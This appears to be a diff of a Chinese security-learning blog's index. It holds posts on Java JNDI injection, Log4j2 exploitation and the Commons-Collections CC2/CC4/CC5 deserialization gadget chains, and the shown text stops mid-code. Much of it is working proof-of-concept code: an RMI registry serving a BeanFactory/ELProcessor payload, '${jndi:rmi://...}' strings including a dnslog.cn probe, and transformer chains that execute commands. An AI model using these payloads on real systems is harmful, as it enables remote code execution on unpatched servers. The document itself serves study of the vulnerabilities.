   <entry>
-    <title>java反序列化之jndi</title>
-    <url>/post/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bjndi/</url>
-    <content><![CDATA[<h1 id="jndi加载本地类利用">jndi加载本地类利用</h1>
-<p>上一个篇中讲了jndi结合RMI的利用,然而这个利用只适用于<code> JDK &lt; 8u191</code>的情况,在高版本的jdk中,我们可以通过<code>加载本地类</code>的方法进行命令执行。</p>
-<p>之前在Reference中传入了一个工厂类名,然后让程序去找这个工厂类的位置,最终加载到了我们所构建的恶意类并调用了其构造方法,而这次我们将直接利用本地存在的工厂类去执行命令。</p>
-<p>这里利用的是<code>tomcat8</code>带有的<code>BeanFactory类</code>,这个类中带有method.invoke可以通过反射来调用任意方法。</p>
-<p>首先导入依赖（这里org.apache.el如果导入失败的话需要换个源,我是用<code>阿里云</code>的源）：</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-catalina<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.5.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.el<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>com.springsource.org.apache.el<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>7.0.26<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>poc代码：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">ResourceRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">true</span>,<span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;x=eval&quot;</span>));</span><br><span class="line">ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;x&quot;</span>, <span class="string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;calc&#x27;]).start()\&quot;)&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">com</span>.sun.jndi.rmi.registry.ReferenceWrapper(ref);</span><br><span class="line">registry.bind(<span class="string">&quot;Object&quot;</span>, referenceWrapper);</span><br></pre></td></tr></table></figure>
-<p>客户端：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Object object=<span class="keyword">new</span> <span class="title class_">InitialContext</span>().lookup(<span class="string">&quot;rmi://127.0.0.1:1099/Object&quot;</span>);</span><br></pre></td></tr></table></figure>
-<p>效果：</p>
-<p><img src="image-20230402123833616.png" alt="image-20230402123833616"></p>
-<p>利用链：<br>
-InitialContext#lookup</p>
-<p>GenericURLContext#lookup</p>
-<p>RegistryContext#lookup</p>
-<p>RegistryContext#decodeObject</p>
-<p>NamingManager#getObjectInstance</p>
-<p>BeanFactory#getObjectInstance</p>
-<p>反射执行的语句：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">new</span>  <span class="title class_">ELProcessor</span>()).eval(<span class="string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new  java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;calc&#x27;]).start()\&quot;)&quot;</span>);</span><br></pre></td></tr></table></figure>
-<p>解释：</p>
-<ol>
-<li>“”.getClass() 返回字符串对象的Class对象。</li>
-<li>Class.forName() 可以根据类的名称返回对应的Class对象。</li>
-<li>newInstance() 可以使用Class对象实例化一个对象。</li>
-<li>getEngineByName() 返回指定名称的脚本引擎对象,这里是JavaScript引擎对象。</li>
-<li>eval() 方法用于执行脚本。</li>
-<li>ProcessBuilder 类可以启动一个新进程并执行操作系统命令。</li>
-</ol>
-<h1 id="jndi-log4j2">jndi+log4j2</h1>
-<p>Log4j2是Apache软件基金会下的一个开源项目,是Java编程语言的一种流行的、模块化的<code>日志记录工具</code>,用于记录应用程序的运行状态信息和调试信息。</p>
-<p>而在2021年11月log4j2爆出了一个代码执行漏洞,影响范围非常大,2.14.1版本及之前的都存在该漏洞</p>
-<p>而这个漏洞的利用正好与jndi注入有关</p>
-<h2 id="环境搭建">环境搭建</h2>
-<p>首先导入依赖（版本小于2.14.1即可）：</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.14.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.14.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>编写log4j2的配置文件</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Configuration</span> <span class="attr">status</span>=<span class="string">&quot;WARN&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--全局参数--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Property</span> <span class="attr">name</span>=<span class="string">&quot;pattern&quot;</span>&gt;</span>%d&#123;yyyy-MM-dd HH:mm:ss,SSS&#125; %5p %c&#123;1&#125;:%L - %m%n<span class="tag">&lt;/<span class="name">Property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Property</span> <span class="attr">name</span>=<span class="string">&quot;logDir&quot;</span>&gt;</span>/data/logs/dust-server<span class="tag">&lt;/<span class="name">Property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">Loggers</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Root</span> <span class="attr">level</span>=<span class="string">&quot;INFO&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">AppenderRef</span> <span class="attr">ref</span>=<span class="string">&quot;console&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">AppenderRef</span> <span class="attr">ref</span>=<span class="string">&quot;rolling_file&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Loggers</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">Appenders</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 定义输出到控制台 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Console</span> <span class="attr">name</span>=<span class="string">&quot;console&quot;</span> <span class="attr">target</span>=<span class="string">&quot;SYSTEM_OUT&quot;</span> <span class="attr">follow</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--控制台只输出level及以上级别的信息--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ThresholdFilter</span> <span class="attr">level</span>=<span class="string">&quot;INFO&quot;</span> <span class="attr">onMatch</span>=<span class="string">&quot;ACCEPT&quot;</span> <span class="attr">onMismatch</span>=<span class="string">&quot;DENY&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">PatternLayout</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">Pattern</span>&gt;</span>$&#123;pattern&#125;<span class="tag">&lt;/<span class="name">Pattern</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">PatternLayout</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Console</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 同一来源的Appender可以定义多个RollingFile,定义按天存储日志 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">RollingFile</span> <span class="attr">name</span>=<span class="string">&quot;rolling_file&quot;</span></span></span><br><span class="line"><span class="tag">                     <span class="attr">fileName</span>=<span class="string">&quot;$&#123;logDir&#125;/dust-server.log&quot;</span></span></span><br><span class="line"><span class="tag">                     <span class="attr">filePattern</span>=<span class="string">&quot;$&#123;logDir&#125;/dust-server_%d&#123;yyyy-MM-dd&#125;.log&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ThresholdFilter</span> <span class="attr">level</span>=<span class="string">&quot;INFO&quot;</span> <span class="attr">onMatch</span>=<span class="string">&quot;ACCEPT&quot;</span> <span class="attr">onMismatch</span>=<span class="string">&quot;DENY&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">PatternLayout</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">Pattern</span>&gt;</span>$&#123;pattern&#125;<span class="tag">&lt;/<span class="name">Pattern</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">PatternLayout</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Policies</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">TimeBasedTriggeringPolicy</span> <span class="attr">interval</span>=<span class="string">&quot;1&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">Policies</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 日志保留策略,配置只保留七天 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">DefaultRolloverStrategy</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">Delete</span> <span class="attr">basePath</span>=<span class="string">&quot;$&#123;logDir&#125;/&quot;</span> <span class="attr">maxDepth</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">IfFileName</span> <span class="attr">glob</span>=<span class="string">&quot;dust-server_*.log&quot;</span> /&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">IfLastModified</span> <span class="attr">age</span>=<span class="string">&quot;7d&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">Delete</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">DefaultRolloverStrategy</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">RollingFile</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Appenders</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>测试：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LOGtest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">( String[] args )</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger(LongFunction.class);</span><br><span class="line">        String username= <span class="string">&quot;$&#123;java:os&#125;&quot;</span>;  ;</span><br><span class="line">        logger.error(<span class="string">&quot;Hello, &#123;&#125;&quot;</span>,username);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p><img src="image-20230402194044347.png" alt="image-20230402194044347"></p>
-<p>这里就输出了操作系统的一些信息,这实际上是log4j2自带的一些功能</p>
-<p>但除此之外,它还支持调用<code>lookup</code>,那么这里就会存在我们之前所说的命令执行漏洞</p>
-<h2 id="漏洞探测">漏洞探测</h2>
-<p>修改测试代码如下：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LOGtest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">( String[] args )</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger(LongFunction.class);</span><br><span class="line">        String username= <span class="string">&quot;$&#123;jndi:rmi://foei54.dnslog.cn/Object&#125;&quot;</span>;  ;</span><br><span class="line">        logger.error(<span class="string">&quot;Hello, &#123;&#125;&quot;</span>,username);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>foei54.dnslog.cn为我们在dnslog平台得到的url</p>
-<p>运行测试代码并查看dns记录,出现以下结果则说明漏洞存在</p>
-<p><img src="image-20230402200004246.png" alt="image-20230402200004246"></p>
-<h2 id="漏洞利用">漏洞利用</h2>
-<p>修改测试代码如下：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LOGtest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">( String[] args )</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger(LongFunction.class);</span><br><span class="line">        String username= <span class="string">&quot;$&#123;jndi:rmi://127.0.0.1:1099/Object&#125;&quot;</span>;  ;</span><br><span class="line">        logger.error(<span class="string">&quot;Hello, &#123;&#125;&quot;</span>,username);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>将之前测试jndi的服务端程序运行起来,然后运行测试代码</p>
-<p>效果：</p>
-<p><img src="image-20230402194654780.png" alt="image-20230402194654780"></p>
-<p>可以看到命令被成功执行了</p>
-<p>实际上在正常的生产环境中,log4j2会写入非常多的事件,哪怕是一个简单的用户登录事件,这时候我们就可以修改用户名的内容为${jndi:rmi://foei54.dnslog.cn/Object}来测试漏洞是否存在。</p>
-<p>参考：</p>
-<p><a href="https://xz.aliyun.com/t/8214">JNDI注入学习</a></p>
-<p><a href="https://blog.csdn.net/lumingzhu111/article/details/121871114">一问三不知之log4j2漏洞简析</a></p>
-<p><a href="https://www.freebuf.com/articles/web/341857.html">深入学习 Log4j2 漏洞原理以及绕过手段</a></p>
+    <title>java反序列化之cc2和cc4</title>
+    <url>/post/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc2%E5%92%8Ccc4/</url>
+    <content><![CDATA[<h1 id="CC4">CC4</h1>
+<p>CC4是针对<code>commons-collections4</code>的4.0版本的一条利用链</p>
+<p>主要是利用<code>TransformingComparator</code>类的<code>compare</code>方法调用了ChainedTransformer类的transform(<code>commons-collections3.2的TransformingComparator无法反序列化</code>)</p>
+<p><img src="image-20230326101200961.png" alt="image-20230326101200961"></p>
+<p>而入口则是PriorityQueue类的readObject方法,整体利用链如下：</p>
+<p>PriorityQueue#readObject</p>
+<p>PriorityQueue#heapify</p>
+<p>PriorityQueue#siftDown</p>
+<p>PriorityQueue#siftDownUsingComparator</p>
+<p>TransformingComparator#compare</p>
+<p>所以通过以下构造方法连成一条链</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chainedTransformer);</span><br><span class="line"><span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(transformingComparator);</span><br></pre></td></tr></table></figure>
+<p>但有几个需要注意的逻辑点</p>
+<p>在PriorityQueue#heapify中有</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">heapify</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> (size &gt;&gt;&gt; <span class="number">1</span>) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">        siftDown(i, (E) queue[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>要想进入循环则必须满足<code>size&gt;&gt;&gt;1要大于0</code>,即变量 “size” 的二进制表示向右移动一位要大于0,size&gt;1</p>
+<p>所以有</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">priorityQueue.add(<span class="number">2</span>);</span><br></pre></td></tr></table></figure>
+<p>但是priorityQueue.add()会调用priorityQueue.offer()进而调用priorityQueue.siftUp(),最终到siftUpUsingComparator()调用了compare方法,也就是说在还没有反序列化之前,就已经命令执行了。</p>
+<p>要解决这个问题方法和之前的一样,<code>在add前断开链,add后在把链接上</code></p>
+<p>故最后的序列化poc就是</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] Transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(Transformers);</span><br><span class="line"></span><br><span class="line"><span class="comment">//这里把链给断开了</span></span><br><span class="line"><span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>());</span><br><span class="line"></span><br><span class="line"><span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(transformingComparator);</span><br><span class="line"></span><br><span class="line">priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">priorityQueue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//利用反射将链连上</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> TransformingComparator.class;</span><br><span class="line"><span class="type">Field</span> <span class="variable">transformerfield</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;transformer&quot;</span>);</span><br><span class="line">transformerfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">transformerfield.set(transformingComparator,chainedTransformer);</span><br><span class="line"></span><br><span class="line">Test.Serialize(priorityQueue);</span><br></pre></td></tr></table></figure>
+<h1 id="CC2">CC2</h1>
+<p>前面提到通过类的动态加载,我们只需要运行<code>templates.newTransformer()</code>方法就可以任意命令执行了</p>
+<p>那么我们可以通过InvokerTransformer类来执行这个方法,就可以实现命令执行</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br><span class="line">invokerTransformer.transform(templates);</span><br></pre></td></tr></table></figure>
+<p>但我们总会遇到一个问题,就是transform的参数不好控制,之前我们都是采用ChainedTransformer+ConstantTransformer来解决的,但在这里,我们的参数是可控的,</p>
+<p>在PriorityQueue#heapify中要向siftDown传入两个参数,而<code>第二个参数就是我们最终传到transform的参数</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">private void heapify() &#123;</span><br><span class="line">    for (int i = (size &gt;&gt;&gt; 1) - 1; i &gt;= 0; i--)</span><br><span class="line">        siftDown(i, (E) queue[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>而这个queue[i]就是我们poc中利用priorityQueue.add方法传入的参数,所以我们只需要传入一个</p>
+<p>templates就可以了</p>
+<p>故最终的poc为：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//实例化TemplatesImpl对象</span></span><br><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//让_name!=null</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">namefield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">namefield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">namefield.set(templates,<span class="string">&quot;123&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//让_bytecodes等于恶意字节码</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">bytecodesfield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">bytecodesfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">byte</span>[] codes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\php_project\\shengji_study\\target\\classes\\runtime.class&quot;</span>));</span><br><span class="line">bytecodesfield.set(templates,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;codes&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//为_tfactory赋值</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">tfactoryfield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">tfactoryfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">tfactoryfield.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"><span class="comment">//templates.newTransformer();</span></span><br><span class="line"></span><br><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br><span class="line"><span class="comment">//invokerTransformer.transform(templates);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//这里把链给断开了</span></span><br><span class="line"><span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));<span class="comment">//这里不能用ChainedTransformer,否则会报错</span></span><br><span class="line"></span><br><span class="line"><span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(transformingComparator);</span><br><span class="line"></span><br><span class="line">priorityQueue.add(templates);<span class="comment">//传入templates</span></span><br><span class="line">priorityQueue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//利用反射将链连上</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> TransformingComparator.class;</span><br><span class="line"><span class="type">Field</span> <span class="variable">transformerfield</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;transformer&quot;</span>);</span><br><span class="line">transformerfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">transformerfield.set(transformingComparator,invokerTransformer);</span><br><span class="line"></span><br><span class="line">Test.Serialize(priorityQueue);</span><br></pre></td></tr></table></figure>
+<p>通过这种方法就可以在不用ChainedTransformer和ConstantTransformer的情况下实现反序列化</p>
+<p>最后附上一张CC链的总图：</p>
+<p><img src="image-20230326145828228.png" alt="image-20230326145828228"></p>
+<h1 id="CC5">CC5</h1>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//实例化TemplatesImpl对象</span></span><br><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//让_name!=null</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">namefield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">namefield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">namefield.set(templates,<span class="string">&quot;123&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//让_bytecodes等于恶意字节码</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">bytecodesfield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">bytecodesfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">byte</span>[] codes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\php_project\\shengji_study\\target\\classes\\runtime.class&quot;</span>));</span><br><span class="line">bytecodesfield.set(templates,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;codes&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//为_tfactory赋值</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">tfactoryfield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">tfactoryfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">tfactoryfield.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//构造lazymap</span></span><br><span class="line"><span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);</span><br><span class="line"><span class="comment">//instantiateTransformer.transform(TrAXFilter.class);</span></span><br><span class="line"></span><br><span class="line">Transformer[] Transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title 